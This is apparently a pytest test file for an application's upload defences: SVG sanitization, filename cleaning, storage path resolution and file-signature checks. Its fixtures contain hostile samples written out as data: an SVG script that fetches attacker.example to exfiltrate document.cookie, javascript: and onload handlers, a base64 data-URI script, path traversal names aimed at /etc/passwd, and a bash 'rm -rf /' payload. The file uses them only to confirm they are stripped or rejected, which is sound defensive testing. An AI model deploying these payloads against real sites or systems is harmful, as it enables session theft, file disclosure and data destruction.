import io
import pytest
from app.core.asset_storage import SvgSecuritySanitizer, FilenameFilter, StorageLocator
from app.core.parser import SignatureVerifier
from app.config import settings

def test_svg_sanitizer_removes_scripts_and_events():
    malicious_svg = b"""<?xml version="1.0" encoding="utf-8"?>
    <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
      <circle cx="50" cy="50" r="40" stroke="green" stroke-width="4" fill="yellow" onload="alert('pwned')" />
      <script type="text/javascript">
        fetch('https://attacker.example/exfil?cookie=' + document.cookie);
      </script>
      <a href="javascript:alert(1)">Click me</a>
      <iframe src="https://evil.example"></iframe>
    </svg>"""

    sanitized = SvgSecuritySanitizer.purify(malicious_svg)
    sanitized_str = sanitized.decode("utf-8")

    assert "<script" not in sanitized_str
    assert "onload" not in sanitized_str
    assert "javascript:" not in sanitized_str
    assert "<iframe" not in sanitized_str
    assert "<circle" in sanitized_str

def test_svg_sanitizer_removes_foreign_objects_and_data_schemes():
    malicious_svg = b"""<svg xmlns="http://www.w3.org/2000/svg">
      <foreignObject width="100" height="50">
        <body xmlns="http://www.w3.org/1999/xhtml">
          <p>Hostile HTML injection</p>
        </body>
      </foreignObject>
      <image href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" />
    </svg>"""

    sanitized = SvgSecuritySanitizer.purify(malicious_svg)
    sanitized_str = sanitized.decode("utf-8")

    assert "foreignObject" not in sanitized_str
    assert "data:text/html" not in sanitized_str

def test_path_traversal_filename_sanitized():
    traversal_filenames = [
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\cmd.exe",
        "nested/../../../var/log/syslog",
    ]

    for bad_name in traversal_filenames:
        cleaned = FilenameFilter.clean(bad_name)
        assert "/" not in cleaned
        assert "\\" not in cleaned
        assert not cleaned.startswith(".")
        dest_path = StorageLocator.resolve_destination("ws-apexdynamics-001", "asset-001", bad_name)
        assert str(settings.STORAGE_DIR) in str(dest_path)

def test_signature_verifier_rejects_empty_file():
    with pytest.raises(ValueError) as exc:
        SignatureVerifier.verify("empty.pdf", b"")
    assert "empty" in str(exc.value).lower()

def test_signature_verifier_rejects_dangerous_executable_preambles():
    dangerous_payloads = [
        ("malware.exe", b"MZ\x90\x00\x03\x00\x00\x00"),
        ("script.sh", b"#!/bin/bash\nrm -rf /"),
        ("rootkit.elf", b"\x7fELF\x02\x01\x01\x00"),
    ]
    for filename, payload in dangerous_payloads:
        with pytest.raises(ValueError) as exc:
            SignatureVerifier.verify(filename, payload)
        assert "dangerous" in str(exc.value).lower() or "prohibited" in str(exc.value).lower()

def test_signature_verifier_rejects_extension_mismatch():
    # File named .pdf but containing plain text or random bytes
    with pytest.raises(ValueError) as exc:
        SignatureVerifier.verify("fake.pdf", b"This is not a real PDF file")
    assert "mismatch" in str(exc.value).lower()

def test_signature_verifier_rejects_binary_in_txt():
    with pytest.raises(ValueError) as exc:
        SignatureVerifier.verify("notes.txt", b"Hello\x00World binary null byte")
    assert "binary content" in str(exc.value).lower()
